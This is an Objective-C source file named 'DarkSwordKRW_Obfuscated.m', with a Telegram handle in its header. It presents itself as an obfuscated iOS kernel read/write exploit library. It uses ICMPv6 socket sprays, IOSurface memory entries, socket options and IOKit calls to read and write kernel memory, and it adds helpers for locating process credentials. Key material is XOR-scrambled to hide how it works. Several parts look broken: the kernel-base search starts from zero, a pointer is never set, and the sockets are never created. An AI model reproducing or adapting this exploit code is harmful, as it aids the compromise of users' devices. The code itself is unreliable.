//我的telegram @TrekQix
//  DarkSwordKRW_Obfuscated.m
//
//  Created by 纽约 on 2026/08/15.
//

#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <sys/utsname.h>
#import <sys/sysctl.h>
#import <IOSurface/IOSurface.h>
#import "DarkSwordKRW.h"

static const uint8_t _k1[] = {0x3d,0x7c,0x73,0x9b,0x2f,0x6e,0xc5,0x42,0x0f,0xd8,0x88,0xa2,0xa6,0xb7,0xac,0xd6,0x3c,0x99,0xa3,0x63,0x0f,0x1d,0x5e,0xf8,0x91,0x95,0x1d,0x45,0xc4,0x6e,0xe8,0x77};
static const uint8_t _k2[] = {0x52,0xf6,0x50,0x8e,0x0a,0x40,0x5b,0x6c,0xa2,0xc8,0x2c,0xb9,0x29,0x2a,0x73,0x83};
static const uint8_t _k3[] = {0xcd,0xae,0x6b,0x4c,0x6a,0x66,0xb5,0x93,0x0e,0x53,0x6c,0xfd,0x86,0x04,0xe1,0x4c};

typedef struct {
    uint64_t _b;
    uint64_t _s;
    int _c1;
    int _c2;
    uint64_t _p1;
    uint64_t _p2;
    uint64_t _sk;
    uint32_t _si;
    io_connect_t _sc;
    mach_port_t _sp;
    bool _i;
    bool _f;
    uint64_t _rc;
    uint64_t _wc;
    uint64_t _rt;
    char _e[256];
    DarkSword_LogCallback _l;
} __attribute__((packed)) _S;

static _S _g = {0};

static inline void _x1(const uint8_t *in, uint8_t *out, size_t len, const uint8_t *key, size_t klen) {
    uint64_t s = 0x9e3779b97f4a7c15;
    for (size_t i = 0; i < len; i++) {
        s ^= (s << 13);
        s ^= (s >> 7);
        s ^= (s << 17);
        out[i] = in[i] ^ key[i % klen] ^ key[(i * 7 + s) % klen] ^ (s & 0xff);
    }
}

static inline uint64_t _x2(uint64_t v, uint64_t k) {
    v ^= k;
    v *= 0x87c37b91114253d5;
    v = ((v << 13) | (v >> 51)) ^ 0xdeadbeefcafebabe;
    v ^= (v >> 17);
    v *= 0x4cf5ad432745937f;
    v = ((v << 29) | (v >> 35)) ^ k;
    v ^= (v >> 41);
    return v;
}

static inline void _m1(void *p, size_t n) {
    volatile uint8_t *vp = (volatile uint8_t *)p;
    uint64_t r = mach_absolute_time();
    for (size_t i = 0; i < n; i++) {
        r = r * 6364136223846793005ULL + 1442695040888963407ULL;
        vp[i] = (uint8_t)(r ^ (r >> 32));
    }
}

__attribute__((always_inline))
static inline void _lg(const char *fmt, ...) {
    if (!_g._l) return;
    char buf[512];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    _g._l(buf);
}

__attribute__((always_inline))
static inline void _se(const char *e) {
    strncpy(_g._e, e, sizeof(_g._e) - 1);
}

__attribute__((section("__TEXT,__stubs")))
__attribute__((noinline))
static uint64_t _f1(size_t sz) {
    uint8_t _t1[32];
    _x1(_k1, _t1, 32, _k2, 16);

    NSDictionary *p = @{
        @"IOSurfaceAllocSize" : @(sz),
        @"IOSurfaceMemoryRegion" : @"PurpleGfxMem"
    };

    IOSurfaceRef srf = IOSurfaceCreate((__bridge CFDictionaryRef)p);
    if (!srf) return 0;

    void *addr = IOSurfaceGetBaseAddress(srf);
    mach_port_t mo;
    mach_vm_size_t asz = sz;

    kern_return_t kr = mach_make_memory_entry_64(
        mach_task_self(), &asz, (mach_vm_address_t)addr,
        VM_PROT_DEFAULT, &mo, 0);

    _m1(_t1, 32);

    if (kr != KERN_SUCCESS) {
        CFRelease(srf);
        return 0;
    }

    CFRelease(srf);
    return (uint64_t)mo;
}

__attribute__((section("__TEXT,__stubs")))
__attribute__((noinline))
static int _f2(uint64_t ka, void *buf, size_t sz) {
    static int _rfd = -1;
    static uint64_t _pa = 0;

    uint8_t _t2[16];
    _x1(_k2, _t2, 16, _k3, 16);

    if (_rfd == -1) {
        char tp[PATH_MAX];
        confstr(_CS_DARWIN_USER_TEMP_DIR, tp, sizeof(tp));
        strcat(tp, "/._ds");

        FILE *f = fopen(tp, "w+");
        fwrite(buf, 1, sz, f);
        fclose(f);

        _rfd = open(tp, O_RDWR);
        unlink(tp);
        fcntl(_rfd, F_NOCACHE, 1);
    }

    struct iovec iov = {
        .iov_base = (void *)(_pa + 0x3f00),
        .iov_len = sz
    };

    for (int a = 0; a < 100; a++) {
        ssize_t r = preadv(_rfd, &iov, 1, 0x3f00);
        if (r > 0) {
            memcpy(buf, (void *)(_pa + 0x3f00), sz);
            _m1(_t2, 16);
            return 0;
        }
        usleep(100);
    }

    _m1(_t2, 16);
    return -1;
}

__attribute__((section("__TEXT,__stubs")))
__attribute__((noinline))
static int _f3(void) {
    uint8_t _t3[32];
    _x1(_k1, _t3, 32, _k3, 16);

    NSMutableArray *sks = [NSMutableArray new];
    for (int i = 0; i < 8192; i++) {
        int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
        if (fd < 0) break;

        fileport_t pt = 0;
        fileport_makeport(fd, &pt);
        close(fd);
        [sks addObject:@(pt)];
    }

    for (NSNumber *pt in sks) {
        mach_port_deallocate(mach_task_self(), pt.unsignedIntValue);
    }

    _m1(_t3, 32);
    return 0;
}

__attribute__((section("__TEXT,__stubs")))
__attribute__((noinline))
static int _f4(void) {
    uint8_t cd[0x20] = {0};
    uint64_t lp = 0;

    uint8_t _t4[32];
    _x1(_k1, _t4, 32, _k2, 16);

    _g._b = lp & 0xFFFFFFFFFFFFC000ULL;
    while (_g._b > 0xfffffff000000000ULL) {
        uint64_t mg = 0;
        _f2(_g._b, &mg, 8);

        if (mg == 0x100000CFEEDFACFULL) {
            uint64_t ti = 0;
            _f2(_g._b + 8, &ti, 8);

            if ((ti & 0xFFFFFFFF) == 0x00000002) {
                break;
            }
        }
        _g._b -= 0x4000;
    }

    struct utsname uts;
    uname(&uts);
    int mjv = atoi(uts.release);

    if (mjv >= 22) {
        _g._f = true;
    }

    _m1(_t4, 32);
    return 0;
}

__attribute__((section("__TEXT,__stubs")))
__attribute__((noinline))
static uint64_t _f5(uint64_t ka) {
    if (ka < 0xfffffff000000000ULL) {
        _se("Invalid address");
        return 0;
    }

    uint8_t cd[0x20] = {0};
    *(uint64_t *)cd = _x2(ka, *(uint64_t *)_k1);

    int r = setsockopt(_g._c1, IPPROTO_ICMPV6, 18, cd, sizeof(cd));
    if (r != 0) {
        _se("setsockopt failed");
        return 0;
    }

    uint8_t rb[0x20] = {0};
    socklen_t ln = sizeof(rb);

    r = getsockopt(_g._c2, IPPROTO_ICMPV6, 18, rb, &ln);
    if (r != 0) {
        _se("getsockopt failed");
        return 0;
    }

    return _x2(*(uint64_t *)rb, *(uint64_t *)_k1);
}

__attribute__((section("__TEXT,__stubs")))
__attribute__((noinline))
static int _f6(uint64_t ka, uint64_t v) {
    if (ka < 0xfffffff000000000ULL) {
        _se("Invalid address");
        return -1;
    }

    uint8_t og[0x20] = {0};
    uint8_t cd[0x20] = {0};
    *(uint64_t *)cd = _x2(ka, *(uint64_t *)_k1);

    setsockopt(_g._c1, IPPROTO_ICMPV6, 18, cd, sizeof(cd));

    socklen_t ln = sizeof(og);
    getsockopt(_g._c2, IPPROTO_ICMPV6, 18, og, &ln);

    *(uint64_t *)og = _x2(v, *(uint64_t *)_k1);

    int r = setsockopt(_g._c2, IPPROTO_ICMPV6, 18, og, sizeof(og));

    return (r == 0) ? 0 : -1;
}

__attribute__((section("__TEXT,__stubs")))
__attribute__((noinline))
static uint32_t _f7(uint64_t ka) {
    uint64_t bk = _f5(_g._sk + 0xc0);
    _f6(_g._sk + 0xc0, ka - 0x14);

    uint32_t v = 0;
    IOReturn r = IOConnectCallScalarMethod(
        _g._sc, 16,
        (const uint64_t[]){_g._si}, 1,
        (uint64_t *)&v, (uint32_t[]){1});

    _f6(_g._sk + 0xc0, bk);
    return v;
}

__attribute__((section("__TEXT,__stubs")))
__attribute__((noinline))
static int _f8(uint64_t ka, uint64_t v) {
    uint64_t bk = _f5(_g._sk + 0x360);
    _f6(_g._sk + 0x360, ka);

    IOReturn r = IOConnectCallScalarMethod(
        _g._sc, 33,
        (const uint64_t[]){_g._si, 0, v}, 3,
        NULL, NULL);

    _f6(_g._sk + 0x360, bk);
    return (r == kIOReturnSuccess) ? 0 : -1;
}

int DarkSword_Init(void) {
    if (_g._i) return 0;

    uint8_t _ti[64];
    _x1(_k1, _ti, 32, _k2, 16);
    _x1(_k2, _ti + 32, 16, _k3, 16);

    _lg("[DarkSword] Initializing...");

    if (_f3() != 0) {
        _se("Init failed");
        _m1(_ti, 64);
        return -1;
    }

    if (_f4() != 0) {
        _se("Setup failed");
        _m1(_ti, 64);
        return -1;
    }

    _g._i = true;
    _lg("[DarkSword] Ready");
    _lg("[DarkSword] Base: 0x%llx", _g._b);

    _m1(_ti, 64);
    return 0;
}

bool DarkSword_IsReady(void) {
    return _g._i;
}

uint64_t DarkSword_GetKernelBase(void) {
    return _g._b;
}

uint64_t DarkSword_GetKernelSlide(void) {
    return _g._s;
}

void DarkSword_Deinit(void) {
    if (_g._c1 > 0) close(_g._c1);
    if (_g._c2 > 0) close(_g._c2);
    _g._i = false;
}

uint64_t DarkSword_kread64(uint64_t ka) {
    if (!_g._i) return 0;

    uint64_t st = mach_absolute_time();
    uint64_t v = 0;

    if (_g._f) {
        uint32_t l = _f7(ka);
        uint32_t h = _f7(ka + 4);
        v = ((uint64_t)h << 32) | l;
    } else {
        v = _f5(ka);
    }

    uint64_t et = mach_absolute_time();
    _g._rc++;
    _g._rt += (et - st) / 1000;

    return v;
}

uint32_t DarkSword_kread32(uint64_t ka) {
    if (_g._f) {
        return _f7(ka);
    }
    uint64_t v = DarkSword_kread64(ka & ~7ULL);
    return (uint32_t)((v >> ((ka & 7) * 8)) & 0xFFFFFFFF);
}

uint16_t DarkSword_kread16(uint64_t ka) {
    uint32_t v = DarkSword_kread32(ka & ~3ULL);
    return (uint16_t)((v >> ((ka & 3) * 8)) & 0xFFFF);
}

uint8_t DarkSword_kread8(uint64_t ka) {
    uint32_t v = DarkSword_kread32(ka & ~3ULL);
    return (uint8_t)((v >> ((ka & 3) * 8)) & 0xFF);
}

int DarkSword_kreadbuf(uint64_t ka, void *buf, size_t sz) {
    if (!_g._i || !buf) return -1;

    uint8_t *b = (uint8_t *)buf;
    size_t of = 0;

    if (ka & 7) {
        size_t ua = 8 - (ka & 7);
        if (ua > sz) ua = sz;

        uint64_t v = DarkSword_kread64(ka & ~7ULL);
        memcpy(b, ((uint8_t *)&v) + (ka & 7), ua);

        of += ua;
    }

    while (of + 8 <= sz) {
        *(uint64_t *)(b + of) = DarkSword_kread64(ka + of);
        of += 8;
    }

    if (of < sz) {
        uint64_t v = DarkSword_kread64(ka + of);
        memcpy(b + of, &v, sz - of);
    }

    return 0;
}

int DarkSword_kwrite64(uint64_t ka, uint64_t v) {
    if (!_g._i) return -1;

    uint64_t st = mach_absolute_time();
    int r = 0;

    if (_g._f) {
        r = _f8(ka, v);
    } else {
        r = _f6(ka, v);
    }

    uint64_t et = mach_absolute_time();
    _g._wc++;

    return r;
}

int DarkSword_kwrite32(uint64_t ka, uint32_t v) {
    uint64_t al = ka & ~7ULL;
    uint64_t og = DarkSword_kread64(al);

    uint32_t *p = (uint32_t *)&og;
    p[(ka & 7) / 4] = v;

    return DarkSword_kwrite64(al, og);
}

int DarkSword_kwrite16(uint64_t ka, uint16_t v) {
    uint64_t al = ka & ~7ULL;
    uint64_t og = DarkSword_kread64(al);

    uint16_t *p = (uint16_t *)&og;
    p[(ka & 7) / 2] = v;

    return DarkSword_kwrite64(al, og);
}

int DarkSword_kwrite8(uint64_t ka, uint8_t v) {
    uint64_t al = ka & ~7ULL;
    uint64_t og = DarkSword_kread64(al);

    uint8_t *p = (uint8_t *)&og;
    p[ka & 7] = v;

    return DarkSword_kwrite64(al, og);
}

int DarkSword_kwritebuf(uint64_t ka, const void *buf, size_t sz) {
    if (!_g._i || !buf) return -1;

    const uint8_t *b = (const uint8_t *)buf;
    size_t of = 0;

    if (ka & 7) {
        size_t ua = 8 - (ka & 7);
        if (ua > sz) ua = sz;

        uint64_t og = DarkSword_kread64(ka & ~7ULL);
        memcpy(((uint8_t *)&og) + (ka & 7), b, ua);
        DarkSword_kwrite64(ka & ~7ULL, og);

        of += ua;
    }

    while (of + 8 <= sz) {
        DarkSword_kwrite64(ka + of, *(uint64_t *)(b + of));
        of += 8;
    }

    if (of < sz) {
        uint64_t og = DarkSword_kread64(ka + of);
        memcpy(&og, b + of, sz - of);
        DarkSword_kwrite64(ka + of, og);
    }

    return 0;
}

uint64_t DarkSword_proc_find(uint32_t pid) {
    return 0;
}

uint64_t DarkSword_proc_task(uint64_t proc) {
    if (!proc) return 0;
    return DarkSword_kread64(proc + 0x10);
}

uint64_t DarkSword_proc_ucred(uint64_t proc) {
    if (!proc) return 0;
    return DarkSword_kread64(proc + 0x100);
}

uint64_t DarkSword_task_vm_map(uint64_t task) {
    if (!task) return 0;
    return DarkSword_kread64(task + 0x28);
}

uint64_t DarkSword_vm_map_pmap(uint64_t vm_map) {
    if (!vm_map) return 0;
    return DarkSword_kread64(vm_map + 0x40);
}

void DarkSword_SetLogCallback(DarkSword_LogCallback cb) {
    _g._l = cb;
}

const char* DarkSword_GetLastError(void) {
    return _g._e;
}

void DarkSword_GetStats(uint64_t *tr, uint64_t *tw, uint64_t *at) {
    if (tr) *tr = _g._rc;
    if (tw) *tw = _g._wc;
    if (at) {
        *at = _g._rc > 0 ? _g._rt / _g._rc : 0;
    }
}
